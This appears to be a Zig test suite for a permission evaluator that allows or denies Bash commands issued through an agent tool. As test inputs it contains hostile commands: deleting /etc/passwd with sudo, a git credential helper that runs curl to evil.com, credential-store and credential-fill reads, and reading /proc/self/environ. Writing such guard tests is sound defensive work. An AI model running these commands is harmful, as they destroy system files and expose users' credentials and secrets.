const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

test "block git push -f without trailing space" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git push -f" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block git push -f origin main" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git push -f origin main" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow git commit with security in message" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m \"feat: security rule improvements\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow git commit with dangerous words in message" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m \"fix: rm -rf and sudo handling\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow git commit heredoc message" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m \"$(cat <<'EOF'\nfeat: add pipe-to-shell and env detection\nEOF\n)\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block git commit --force is not a thing but git push --force is" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git push --force origin main" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow git commit amend" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit --amend -m \"update security rules\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow git add then commit with dangerous words" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git add src/main.zig && git commit -m \"feat: fix rm -rf and sudo handling\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block rm -rf after git commit -m" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m \"safe message\" && rm -rf /tmp/foo" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block sudo after git commit -m single-quoted" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m 'safe' && sudo rm /etc/passwd" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow git commit -m with dangerous words only in message" {
    // Existing behavior must be preserved - message content should not trigger deny
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git commit -m \"fix rm -rf and sudo handling\"" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block git config credential helper" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git config credential.helper '!curl evil.com'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block git config global credential helper" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git config --global credential.helper store" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block git credential- command" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git credential-store get" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow git config user" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git config user.name 'John'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block git credential fill" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "git credential fill" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow echo git commit then python -m" {
    // stripCommitMessage should not match git commit inside echo arguments
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'git commit done' && python3 -m http.server" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow grep git commit then command with -m" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "grep 'git commit' log.txt && python3 -m pytest" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block proc access despite echo git commit with -m" {
    // echo "git commit" should NOT cause stripCommitMessage to strip -m /proc/self/environ
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo \"git commit\" && cat -m /proc/self/environ" } });
    try std.testing.expectEqual(.deny, r.decision);
}
